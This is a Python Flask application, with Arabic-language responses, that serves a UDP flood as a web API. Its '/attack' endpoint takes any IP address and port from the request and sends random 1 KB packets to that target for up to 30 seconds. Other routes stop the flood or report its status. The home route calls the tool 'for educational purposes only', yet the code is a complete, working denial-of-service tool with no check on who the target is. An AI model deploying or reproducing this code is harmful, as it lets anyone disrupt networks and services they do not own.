from flask import Flask, request, jsonify
import socket
import random
import threading
import time
import os

app = Flask(__name__)

attack_active = False
current_attack_thread = None

@app.route('/')
def home():
    return jsonify({
        "status": "API جاهز",
        "طريقة الاستخدام": "/attack?ip=1.2.3.4&port=80&time=10",
        "ملاحظة": "لأغراض تعليمية فقط"
    })

@app.route('/attack')
def attack():
    global attack_active, current_attack_thread
    
    ip = request.args.get('ip')
    port = request.args.get('port')
    time_param = request.args.get('time', default=10, type=int)
    
    if not ip or not port:
        return jsonify({
            "خطأ": "يجب إدخال ip و port",
            "مثال": "/attack?ip=1.2.3.4&port=80&time=10"
        }), 400
    
    if attack_active:
        return jsonify({"خطأ": "هناك هجوم نشط بالفعل"}), 429
    
    try:
        port = int(port)
        duration = min(time_param, 30)  # 30 ثانية كحد أقصى
        
        def udp_attack():
            global attack_active
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                packet = random._urandom(1024)
                end_time = time.time() + duration
                
                while time.time() < end_time and attack_active:
                    sock.sendto(packet, (ip, port))
                    time.sleep(0.001)
                
                sock.close()
            except:
                pass
            finally:
                attack_active = False
        
        attack_active = True
        current_attack_thread = threading.Thread(target=udp_attack)
        current_attack_thread.start()
        
        return jsonify({
            "نجاح": True,
            "رسالة": f"تم بدء الهجوم على {ip}:{port}",
            "المدة": f"{duration} ثانية"
        })
        
    except:
        return jsonify({"خطأ": "بيانات غير صحيحة"}), 400

@app.route('/stop')
def stop():
    global attack_active
    attack_active = False
    return jsonify({"رسالة": "تم إيقاف الهجوم"})

@app.route('/status')
def status():
    return jsonify({
        "الهجوم_نشط": attack_active,
        "الوقت": time.strftime("%H:%M:%S")
    })

if __name__ == '__main__':
    app.run(debug=False)
